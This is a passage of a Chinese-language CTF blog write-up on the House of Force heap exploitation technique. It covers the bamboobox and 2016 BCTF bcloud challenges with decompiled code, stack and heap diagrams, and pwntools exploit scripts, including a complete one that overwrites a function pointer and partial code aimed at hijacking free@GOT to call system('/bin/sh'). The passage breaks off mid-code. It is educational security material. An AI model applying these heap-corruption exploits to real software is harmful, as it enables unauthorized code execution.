的汇编代码 下图：</span><br></pre></td></tr></table></figure><p><a href="https://imgchr.com/i/JHrtQ1" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/04/30/JHrtQ1.png" alt="JHrtQ1.png"></a></p><p>而 在程序要结束的时候 会发现   他会  call goodbye_message指针。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">case <span class="number">5</span>:</span><br><span class="line">        ((void (__fastcall *)(char *, char *))v3[<span class="number">1</span>])(&amp;buf, &amp;buf);</span><br><span class="line">        <span class="keyword">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>所以我们 可以通过 将 goodbye_message函数指针 给换成 magic () 函数指针。从而在结束 exit 的时候 pwn 掉程序。</p><p>程序的   change_item 函数存在 堆溢出 漏洞。 见下图。<br><img src="https://s1.ax1x.com/2020/04/30/JHDgVU.png" alt="JHDgVU.png"><br>我们的 目的：将 goodbye_message函数指针 给换成 magic () 函数指针</p><p>先malloc 一个 chunk            产生 top chunk<br>将  top chunk 的size    设置为  -1   即      0x ffffffff ffffffff<br> 计算 malloc 的参数 zise      使得 new top chunk =   下次 malloc我们 想要申请到的  malloc<br>然后 malooc 就申请到了 我们想要的 chunk</p><h1 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">'./bamboobox'</span>)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">additem</span><span class="params">(length, name)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(length))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modify</span><span class="params">(idx, length, name)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"3"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(length))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"4"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">magic = <span class="number">0x400d49</span></span><br><span class="line">gdb.attach(r)</span><br><span class="line">additem(<span class="number">0x30</span>,<span class="string">"aaaa"</span>) <span class="comment">#0</span></span><br><span class="line">payload=<span class="string">"a"</span>*<span class="number">0x30</span>+<span class="string">"b"</span>*<span class="number">8</span>+p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">modify(<span class="number">0</span>,<span class="number">0x41</span>,payload)               <span class="comment"># top chunk size =-1</span></span><br><span class="line">offset_to_heap_base = -(<span class="number">0x40</span> + <span class="number">0x20</span>)</span><br><span class="line">malloc_size = offset_to_heap_base - <span class="number">0x10</span><span class="comment">#0x8 - 0xf                这里我就按照我的 理解了。  虽然注释的 其实是更准确。</span></span><br><span class="line">additem(malloc_size, <span class="string">"dada"</span>)</span><br><span class="line">additem(<span class="number">0x10</span>, p64(magic) * <span class="number">2</span>)</span><br><span class="line"><span class="keyword">print</span> r.recv()</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p><strong><strong><strong><strong><strong><strong><strong><strong><strong>****</strong></strong></strong></strong></strong></strong></strong></strong></strong>调试 中的 图<br><br><img src="https://s1.ax1x.com/2020/04/30/JHDR54.png" alt="JHDR54.png"><br></p><h1 id="2016-BCTF-bcloud"><a href="#2016-BCTF-bcloud" class="headerlink" title="2016 BCTF bcloud"></a>2016 BCTF bcloud</h1><p>参考链接：</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">https:</span>/<span class="regexp">/www.anquanke.com/post</span><span class="regexp">/id/</span><span class="number">175630</span><span class="comment">#h2-19</span></span><br></pre></td></tr></table></figure><p>查看文件属性和开启保护：开启了 NX  且  Partial RELRO</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">$</span> <span class="string">checksec</span> <span class="string">bcloud</span></span><br><span class="line">    <span class="attr">Arch:</span>     <span class="string">i386-32-little</span></span><br><span class="line">    <span class="attr">RELRO:</span>    <span class="string">Partial</span> <span class="string">RELRO</span></span><br><span class="line">    <span class="attr">Stack:</span>    <span class="string">Canary</span> <span class="string">found</span></span><br><span class="line">    <span class="attr">NX:</span>       <span class="string">NX</span> <span class="string">enabled</span></span><br><span class="line">    <span class="attr">PIE:</span>      <span class="literal">No</span> <span class="string">PIE</span> <span class="string">(0x8048000)</span></span><br><span class="line"><span class="string">$</span> <span class="string">file</span> <span class="string">bcloud</span></span><br><span class="line"><span class="attr">bcloud:</span> <span class="string">ELF</span> <span class="number">32</span><span class="string">-bit</span> <span class="string">LSB</span> <span class="string">executable,</span> <span class="string">Intel</span> <span class="number">80386</span><span class="string">,</span> <span class="string">version</span> <span class="number">1</span> <span class="string">(SYSV),</span> <span class="string">dynamically</span> <span class="string">linked,</span> <span class="string">interpreter</span> <span class="string">/lib/ld-,</span> </span><br><span class="line"><span class="string">for</span> <span class="string">GNU/Linux</span> <span class="number">2.6</span><span class="number">.24</span><span class="string">,</span> <span class="string">BuildID[sha1]=96a3843007b1e982e7fa82fbd2e1f2cc598ee04e,</span> <span class="string">stripped</span></span><br></pre></td></tr></table></figure><p>拖入ida 发现 是个 菜单题：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">cdecl <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  sub_804899C();                      <span class="comment">//在开始之前 首先执行了  这个函数。</span></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;                                             <span class="comment">// 1.New note</span></span><br><span class="line">                                                <span class="comment">// 2.Show note</span></span><br><span class="line">                                                <span class="comment">// 3.Edit note</span></span><br><span class="line">                                                <span class="comment">// 4.Delete note</span></span><br><span class="line">                                                <span class="comment">// 5.Syn</span></span><br><span class="line">                                                <span class="comment">// 6.Quit</span></span><br><span class="line">                                                <span class="comment">// option---&gt;&gt;</span></span><br><span class="line">    <span class="keyword">switch</span> ( metu() )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        New();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        Show();                                 <span class="comment">// puts("WTF? Something strange happened.");</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        Edit();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        Delete();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        Syn();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">        Quit();                                 <span class="comment">// puts("Bye!\n");</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        sub_8048C6C();                          <span class="comment">// Invalid option</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们看下 sub_804899C()</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">sub_804899C</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  huanying();</span><br><span class="line">  <span class="keyword">return</span> sub_804884E();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">huanying()</span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">sub_80487A1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+1Ch] [ebp-5Ch]</span></span><br><span class="line">  <span class="keyword">char</span> *v2; <span class="comment">// [esp+5Ch] [ebp-1Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+6Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x50</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Input your name:"</span>);</span><br><span class="line">  shuru((<span class="keyword">int</span>)&amp;s, <span class="number">0x40</span>, <span class="string">'\n'</span>);  <span class="comment">//将输入 name 拷贝到 ebp-5Ch 处  填充 栈    如果将 name 的字节长度 为 0x40字节的话字符串最后的 \x00 将会在 ebp-1Ch  上 </span></span><br><span class="line">  v2 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x40</span>u);  <span class="comment">//将申请到的 chunk的chunk_head_Addr  放入 栈 ebp-1Ch 中   </span></span><br><span class="line">                               <span class="comment">//于是 \x00被覆盖    在下面的 sub_8048779((int)v2) 函数中 输出name时 将会 连着 申请到的 chunk的chunk_head_Addr 给输出出来。</span></span><br><span class="line">  dword_804B0CC = (<span class="keyword">int</span>)v2;</span><br><span class="line">  <span class="built_in">strcpy</span>(v2, &amp;s);             <span class="comment">//将输入 name 拷贝到 ebp-1C 处</span></span><br><span class="line">  sub_8048779((<span class="keyword">int</span>)v2);       </span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  sub_8048779((<span class="keyword">int</span>)v2)</span><br><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_8048779</span><span class="params">(<span class="keyword">int</span> v2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Hey %s! Welcome to BCTF CLOUD NOTE MANAGE SYSTEM!\n"</span>, v2);   <span class="comment">//在这里就泄露了 heap_first_chunk_head_addr</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Now let's set synchronization options."</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以看个图，看起来会 更 明了些！<br><img src="https://s1.ax1x.com/2020/04/30/JHD6bT.png" alt="JHD6bT.png"><br>然后接着程序流程 我们来到了  sub_804884E() 这个函数：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">sub_804884E</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> Org; <span class="comment">// [esp+1Ch] [ebp-9Ch]</span></span><br><span class="line">  <span class="keyword">char</span> *v2; <span class="comment">// [esp+5Ch] [ebp-5Ch]</span></span><br><span class="line">  <span class="keyword">int</span> host; <span class="comment">// [esp+60h] [ebp-58h]</span></span><br><span class="line">  <span class="keyword">char</span> *v4; <span class="comment">// [esp+A4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [esp+ACh] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;Org, <span class="number">0</span>, <span class="number">0x90</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Org:"</span>);</span><br><span class="line">  shuru((<span class="keyword">int</span>)&amp;Org, <span class="number">0x40</span>, <span class="string">'\n'</span>);                  <span class="comment">//输入最多 0x40字节内容  填充 栈空间 ebp-0x9C</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Host:"</span>);</span><br><span class="line">  shuru((<span class="keyword">int</span>)&amp;host, <span class="number">0x40</span>, <span class="string">'\n'</span>);                <span class="comment">// 输入最多 0x40字节内容  填充 栈空间 ebp-0x58</span></span><br><span class="line">  v4 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x40</span>u);                   <span class="comment">// host  返回值即 申请到 chunk 的chunk_mem_addr  存在了 ebp-0x14 位置</span></span><br><span class="line">  v2 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x40</span>u);                   <span class="comment">// Org   返回值即 申请到 chunk 的chunk_mem_addr  存在了 ebp-0x5C 位置</span></span><br><span class="line">  dword_804B0C8 = (<span class="keyword">int</span>)v2;</span><br><span class="line">  dword_804B148 = (<span class="keyword">int</span>)v4;                      <span class="comment">//下面的 strcpy 函数 ，仍然是 漏洞点。 </span></span><br><span class="line">  <span class="built_in">strcpy</span>(v4, (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;host);              <span class="comment">// 栈中v4和v2存着是堆上两个相邻的 chunk的chunk_mem_addr,  如果host 我们填充 0x40字节内容，字符串最后的\x00</span></span><br><span class="line">                                                <span class="comment">//就在 栈中v2位置了， 因为 malloc 返回的值 放在 了 v2上，所以 \x00被覆盖 </span></span><br><span class="line">                                                <span class="comment">//所以 这个strcpy函数 把host的内容并连着 Org_chunk_mem_addr 和Org的内容给 拷贝到 Org_chunk_mem_addr指向的位置处了</span></span><br><span class="line">  <span class="built_in">strcpy</span>(v2, &amp;Org);                             <span class="comment">//Org_chunk_mem_addr 会覆盖 Org_chunk_prev内容，我们写入发Org内容会覆盖 Org_chunk_size</span></span><br><span class="line">                                                 <span class="comment">//我们把Org 写入0xffffffff  </span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"OKay! Enjoy:)"</span>);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下图为 填充好 host 和Org 后的栈的情况<br><img src="https://s1.ax1x.com/2020/04/30/JHDyrV.png" alt="JHDyrV.png"><br>House in force 的作用 是让我们在任意地址写入任意值。一定要记着这个！对我们理清思路很有帮助！<br>我们 是要拿 shell，执行system（”/bin/sh”）,</p><p>system 程序不存在，就首先想着 泄露libc 加载基地址 ，然后 进行简单 计算就可得到，<br>说到 泄露  一般 我们找 程序中的 show 函数，但发现 它 是个 骗子函数，啥作用没有，<br>于是我们 便把 目光放在 了 即sub_8048B63() 上，即 delete note函数 中  free(ptr); </p><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> sub_8048B63()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> <span class="keyword">id</span>; <span class="comment">// [esp+18h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">void</span> *ptr; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  puts(<span class="string">"Input the id:"</span>);</span><br><span class="line">  <span class="keyword">id</span> = sub_8048709();</span><br><span class="line">  <span class="keyword">if</span> ( <span class="keyword">id</span> &lt; <span class="number">0</span> || <span class="keyword">id</span> &gt; <span class="number">9</span> )</span><br><span class="line">    <span class="keyword">return</span> puts(<span class="string">"Invalid ID."</span>);</span><br><span class="line">  ptr = (<span class="keyword">void</span> *)note_list[<span class="keyword">id</span>];                  <span class="comment">//这个note_list[id]  作为 下面 free的参数   我们想办法 使其是 puts_got</span></span><br><span class="line">  <span class="keyword">if</span> ( !ptr )</span><br><span class="line">    <span class="keyword">return</span> puts(<span class="string">"Note has been deleted."</span>);</span><br><span class="line">  note_list[<span class="keyword">id</span>] = <span class="number">0</span>;</span><br><span class="line">  note_len[<span class="keyword">id</span>] = <span class="number">0</span>;</span><br><span class="line">  free(ptr);                                 <span class="comment">//一个 参数 的 函数，我们可构造 system（"/bin/sh"） 和puts(plt_got)</span></span><br><span class="line">  <span class="keyword">return</span> puts(<span class="string">"Delete success."</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以通过 House in force 漏洞，在free_got处 写入  puts_plt 地址，<br>这样便可以泄露的了 puts_got 地址从而得到libc_base_addr 从而得到 system_got 地址</p><p>然后再接下来 将 free_got 地址写入   system_got,将 /bin/sh 正常 传入 note_list[id] ，执行 free(ptr);    便可拿到 shell。<br>我们的 总体思路有了，沿着思路走没意外话的 就可顺利拿到shell。<br> 我们看下 create()函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_80489AE</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+18h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">9</span> &amp;&amp; note_list[i]; ++i )    <span class="comment">// int dword_804B120[10]</span></span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( i == <span class="number">10</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Lack of space. Upgrade your account with just $100 :)"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Input the length of the note content:"</span>);</span><br><span class="line">  v2 = sub_8048709();                           <span class="comment">// 输入  10进制 数</span></span><br><span class="line">  note_list[i] = (<span class="keyword">int</span>)<span class="built_in">malloc</span>(v2 + <span class="number">4</span>);           <span class="comment">// malloc(v2 + 4)</span></span><br><span class="line">  <span class="keyword">if</span> ( !note_list[i] )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  note_len[i] = v2;                             <span class="comment">// int dword_804B0A0[10]</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Input the content:"</span>);</span><br><span class="line">  shuru(note_list[i], v2, <span class="string">'\n'</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Create success, the id is %d\n"</span>, i);</span><br><span class="line">  result = i;</span><br><span class="line">  dword_804B0E0[i] = <span class="number">0</span>;                         <span class="comment">// .bss:0804B0E0 ; int dword_804B0E0[16]</span></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>了解下 note的结构体<br>大概是下面这样：</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">struct note</span><br><span class="line">&#123;</span><br><span class="line">   int note_len[i]；     //其中 size 存在 note_len[<span class="number">10</span>] 数组里了       数组地址：<span class="number">0x804b0a0</span></span><br><span class="line">   int content_addr[i]; //其中  size 存在 note_list[<span class="number">10</span>] 数组里了       数组地址：<span class="number">0804B120</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里放张图吧，就是数组的内容。//看看有助于了解程序，阅读通畅！了解就好，这是后面调试的时候 截的一个图。<br><img src="https://s1.ax1x.com/2020/04/30/JHDhG9.png" alt="JHDhG9.png"></p><p><img src="https://s1.ax1x.com/2020/04/30/JHDfPJ.png" alt="JHDfPJ.png"><br>我们 接着 free(ptr) 这个 线索走，不管我们的 edit note函数 还是 delete 的函数，几乎都是对  content_addr[i] 的操作，我们可以通过edit note函数，向content_addr[i]指向的 里写入内容，比如像向 free_got 中写入 puts_plt就可以通过edit note函数 实现。<br>不过，在写入之前 我们 必须得能控制得了 content_addr[i] 的地址是  free_got ，才能向free_got 中写入 puts_plt。这里我们就通过 house in force漏洞实现。</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">我们首先控制 new _top_chunk_addr = content_addr(<span class="number">0x0804B120</span>)<span class="number">-4</span>*<span class="number">2</span> </span><br><span class="line">          而 old_top_chunk_addr = <span class="number">0x81d61f8</span></span><br><span class="line">                                  <span class="comment">// old_top_chunk_addr 为 (Heap_base_mem_addr - 8)+(0x40+0x8)*7</span></span><br><span class="line"></span><br><span class="line">所以       malloc应该申请的 参数 =  (new _top_chunk_addr - old_top_chunk_addr)<span class="number">-4</span>*<span class="number">2</span></span><br><span class="line"></span><br><span class="line">通过 creat(new_top_chunk_head-old_top_chunk_head,'Chunk_fake') 就可以malloc 到一个 特别大的chunk，作用其实就是为了我们接下来再malloc 可申请到我们 含有 content_addr[<span class="number">10</span>] 的chunk</span><br><span class="line">create 完这个 Chunk_fake 后，我们可通过 p main_arena 查看当前top_chunk_mem_addr  我们将它减去 <span class="number">4</span>*<span class="number">2</span> 就好      <span class="comment">//肯定会有更好的 查看方法，暂时我觉得这个还挺有用。</span></span><br><span class="line">注意 因为 每次堆加载的地址  都不一样，我们可 通过最初 输入 name 泄露出 heap_first_chunk_mem_Addr ,减去 - <span class="number">4</span>*<span class="number">2</span> 得到  heap_first_chunk_addr</span><br></pre></td></tr></table></figure><p> 再通过上面代码框中的计算 就是top chunk addr了 </p><p>嗯。。。我觉得 看着代码 说吧，建议大家也多调试！！！</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">creat(<span class="number">0x40</span>,<span class="string">'Chunk1'</span>)             <span class="meta">#0   0x81d6120   chunk0</span></span><br><span class="line">creat(<span class="number">0x40</span>,<span class="string">'Chunk2'</span>)             <span class="meta">#1   0x81d6120   chunk1</span></span><br><span class="line">creat(<span class="number">0x40</span>,<span class="string">'/bin/sh\x00'</span>)        <span class="meta">#2   0x81d6168   chunk2</span></span><br><span class="line">creat(<span class="number">0x40</span>,<span class="string">'Chunk4'</span>)             <span class="meta">#3   0x81d61b0   chunk3     top: 0x81d61f8</span></span><br><span class="line"></span><br><span class="line">old_top_chunk_head=Heap_base_addr+(<span class="number">0x40</span>+<span class="number">0x8</span>)*<span class="number">7</span></span><br><span class="line"><span class="keyword">new</span><span class="type">_top_chunk_head</span>=<span class="number">0x0804B120</span><span class="number">-0x8</span></span><br><span class="line">creat(<span class="keyword">new</span><span class="type">_top_chunk_head</span>-old_top_chunk_head,<span class="string">'Chunk_fake'</span>)     <span class="meta"># fake chunk4  #4     上面说到这里了，</span></span><br></pre></td></tr></table></figure><p>在上面代的基础上  再malloc 一个chunk ，此时返回值 就是note_list[10]的地址了。<br>同时向里面写入  puts_got 和 free_got   就是将  note_list[0] 和note_list[1] 地址给覆盖了！<br>然后就可以使用edit note 函数 将  note_list[i] 指向的内容给换了！</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">creat<span class="comment">(0x40,p32(bcloud.got['puts'])</span>+p<span 